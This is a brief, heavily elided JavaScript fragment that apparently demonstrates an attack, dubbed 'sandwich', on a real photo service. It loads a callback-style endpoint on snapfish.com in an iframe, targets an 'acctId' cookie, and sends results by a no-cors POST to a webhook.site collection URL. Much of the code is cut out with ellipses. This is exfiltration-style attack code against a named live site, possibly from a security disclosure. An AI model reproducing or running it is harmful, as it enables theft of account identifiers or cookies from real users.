async function sandwich(target, cookie) {
    ...
    iframe.onload = async () => {
        ...
        // Step 3: Send a fetch request
            ...
            const x2 = await fetch("https://webhook.site/4d47030c-63f3-4406-bd1c-fcbd7ad9fd1d/", {
              method: "POST",
              mode: 'no-cors',
              headers: {
...
setTimeout(sandwich, 100, 'https://www.snapfish.com/create/builderwidget?callback=loadBuilder&client=store&guestAccount=true', 'acctId');
